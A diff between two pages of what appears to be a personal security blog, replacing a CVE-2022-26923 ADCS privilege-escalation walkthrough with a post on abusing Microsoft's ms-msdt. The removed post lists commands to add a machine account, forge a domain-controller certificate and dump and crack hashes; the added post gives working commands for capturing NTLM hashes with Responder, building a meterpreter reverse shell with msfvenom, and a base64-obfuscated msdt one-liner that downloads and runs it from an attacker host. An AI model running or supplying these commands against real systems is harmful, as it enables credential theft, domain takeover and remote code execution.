@@ -10,7 +10,7 @@
   
   <title>
     
-      CVE-2022-26923 ADCS Priv Sc | 
+      Microsoft ms-msdt Abuse | 
     
   </title>
   <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
@@ -144,8 +144,8 @@
 </header>
 
     <div id="article-banner">
-  <h2>CVE-2022-26923 ADCS Priv Sc</h2>
-  <p class="post-date">2022-05-29</p>
+  <h2>Microsoft ms-msdt Abuse</h2>
+  <p class="post-date">2022-05-31</p>
   <div class="arrow-down">
     <a href="javascript:;"></a>
   </div>
@@ -153,47 +153,30 @@
 <main class="app-body flex-box">
   <!-- Article START -->
   <article class="post-article">
-    <section class="markdown-content"><h1 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h1><p>In this blog post, we will dive into the exploitation of Active Directory Certificate Service Privilege Escalation vulnability that originally discover by <a target="_blank" rel="noopener" href="https://twitter.com/ly4k_">ly4k</a>. More info can be found on his blog <a target="_blank" rel="noopener" href="https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4">post</a>.</p>
-<h1 id="Elements-of-ADCS"><a href="#Elements-of-ADCS" class="headerlink" title="Elements of ADCS"></a>Elements of ADCS</h1><ol start="0">
-<li>ADCS: Active Directory Certificate Service</li>
-<li>PKI: public key infrastructure</li>
-<li>PKINIT: preauthentication mechanism for kerbero 5</li>
-<li>Certificate templete<ul>
-<li>user templete<br>- UPN: userprincialname (unqiue)</li>
-<li>machine templete<br>- dnsHostname</li>
-</ul>
-</li>
+    <section class="markdown-content"><h1 id="catch-net-NTLM-hash"><a href="#catch-net-NTLM-hash" class="headerlink" title="catch net-NTLM hash"></a>catch net-NTLM hash</h1><ol>
+<li>Start Responder listening<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Responder -I eth1</span><br></pre></td></tr></table></figure></li>
+<li>ms-msdt to access remote smb service<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param &quot;IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(\\\\192.168.56.100\\share\\good)/.exe&quot;</span><br></pre></td></tr></table></figure>
+<img src="/images/msdt-getNTLM.png"></li>
 </ol>
-<h1 id="Main-issue"><a href="#Main-issue" class="headerlink" title="Main issue"></a>Main issue</h1><ul>
-<li>dnsHostname isn’t validated when requesting certificate<br><img src="/images/PKINIT.png"></li>
-</ul>
-<h1 id="Steps-of-exploitation"><a href="#Steps-of-exploitation" class="headerlink" title="Steps of exploitation"></a>Steps of exploitation</h1><ol>
-<li>find ADCS service<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec ldap &lt;dc_ip&gt; -u &lt;domain_user&gt; -p &lt;password&gt; -M ADCS</span><br></pre></td></tr></table></figure></li>
-<li>check machineAccountQuote<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec ldap &lt;dc_ip&gt; -u &lt;domain_user&gt; -p &lt;password&gt; -M maq</span><br></pre></td></tr></table></figure></li>
-<li>create a new machine to the domain, specify “SAMR” method if not LDAPS. There is not SPN attribute if machine is added by “SAMR” protocal.<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-addcomputer <span class="string">&#x27;&lt;adcs_servername&gt;.&lt;domain_name&gt;\&lt;domain_user&gt;:&lt;password&gt;&#x27;</span> -method SAMR -computer-name <span class="string">&#x27;&lt;new_machine_name&gt;&#x27;</span> -computer-pass <span class="string">&#x27;&lt;password&gt;&#x27;</span></span><br></pre></td></tr></table></figure></li>
-<li>change dnsHostname properity<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set-AdComputer &lt;new_machine&gt; -dnsHostname <span class="variable">$null</span></span><br><span class="line">set-AdComputer &lt;new_machine&gt; -dnsHostname &lt;Domain_Controller&gt;.&lt;domain_name&gt;</span><br></pre></td></tr></table></figure></li>
-<li>request certificate<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req <span class="string">&#x27;&lt;domain_name&gt;/&lt;new_machine_name&gt;$:&lt;password&gt;@&lt;adcs_servername&gt;&#x27;</span> -templete Machine -ca &lt;ca_name&gt;</span><br></pre></td></tr></table></figure></li>
-<li>autenciation to kerbero<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx &lt;pfx_file&gt;</span><br></pre></td></tr></table></figure></li>
-<li>dump secrets<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretdump <span class="string">&#x27;&lt;Domain_Controller&gt;&#x27;</span> -just-dc-user -k -no-pass -dc-ip &lt;dc_ip&gt;</span><br></pre></td></tr></table></figure></li>
-<li>crack NTLM hash<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 1800 &lt;ntlm_hash_file&gt; rockyou.txt</span><br></pre></td></tr></table></figure></li>
+<h2 id="get-reverse-shell"><a href="#get-reverse-shell" class="headerlink" title="get reverse shell"></a>get reverse shell</h2><ol>
+<li>generate meterpreter powershell<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.100 lport=443 -f psh -o great.ps1</span><br></pre></td></tr></table></figure></li>
+<li>powershell onliner to execute reverse shell<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).downloadstring(&#x27;http://192.168.56.100:8000/meter.ps1&#x27;)</span><br></pre></td></tr></table></figure></li>
+<li>base64 encoding for space respecting<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">command = <span class="string">f&quot;IEX(New-Object Net.WebClient).downloadstring(&#x27;http://192.168.56.100:8000/meter.ps1&#x27;)&quot;</span></span><br><span class="line">base64_payload = base64.b64encode(command.encode(<span class="string">&quot;utf-8&quot;</span>)).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br></pre></td></tr></table></figure></li>
+<li>on victim server<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param &quot;IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression(&#x27;[System.Text.Encoding]&#x27;+[char]58+[char]58+&#x27;UTF8.GetString([System.Convert]&#x27;+[char]58+[char]58+&#x27;FromBase64String(&#x27;+[char]34+&#x27;SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuZG93bmxvYWRzdHJpbmcoJ2h0dHA6Ly8xOTIuMTY4LjU2LjEwMDo4MDAwL2dyZWF0LnBzMScp&#x27;+[char]34+&#x27;))&#x27;))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO&quot;</span><br></pre></td></tr></table></figure>
+<img src="/images/msdt-rs.png"></li>
 </ol>
-<h1 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h1><p><a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923">Microsoft Security Update for CVE-2022-26923</a> </p>
-<ul>
-<li>in this patch, new object ID was introduced in new certificate to further fingerprint the user</li>
-<li>validation of dnsHostname added, only allow you to use the one matching the computer name</li>
-</ul>
 </section>
     <!-- Tags START -->
     
       <div class="tags">
         <span>Tags:</span>
         
-  <a href="/tags#CVE" >
-    <span class="tag-code">CVE</span>
+  <a href="/tags#windows" >
+    <span class="tag-code">windows</span>
   </a>
 
-  <a href="/tags#ADCS" >
-    <span class="tag-code">ADCS</span>
+  <a href="/tags#lolbas" >
+    <span class="tag-code">lolbas</span>
   </a>
 
       </div>
@@ -204,13 +187,13 @@
   <div class="nav-container">
     <!-- reverse left and right to put prev and next in a more logic postition -->
     
-    
-      <a class="nav-right" href="/2022/05/31/microsoft-msdt-abuse/">
+      <a class="nav-left" href="/2022/05/29/cve-2022-26923/">
+        <span class="nav-arrow">← </span>
         
-          Microsoft ms-msdt Abuse
+          CVE-2022-26923 ADCS Priv Sc
         
-        <span class="nav-arrow"> →</span>
       </a>
+    
     
   </div>
 
@@ -240,7 +223,7 @@
   <div class="toc-main">
     <strong class="toc-title">Catalog</strong>
     
-      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Background"><span class="toc-nav-text">Background</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Elements-of-ADCS"><span class="toc-nav-text">Elements of ADCS</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Main-issue"><span class="toc-nav-text">Main issue</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Steps-of-exploitation"><span class="toc-nav-text">Steps of exploitation</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Mitigation"><span class="toc-nav-text">Mitigation</span></a></li></ol>
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#catch-net-NTLM-hash"><span class="toc-nav-text">catch net-NTLM hash</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#get-reverse-shell"><span class="toc-nav-text">get reverse shell</span></a></li></ol></li></ol>
     
   </div>
 </aside>
@@ -250,7 +233,7 @@
 
 <script>
   (function () {
-    var url = 'http://example.com/2022/05/29/cve-2022-26923/';
+    var url = 'http://example.com/2022/05/31/microsoft-msdt-abuse/';
     var banner = ''
     if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
       $('#article-banner').css({
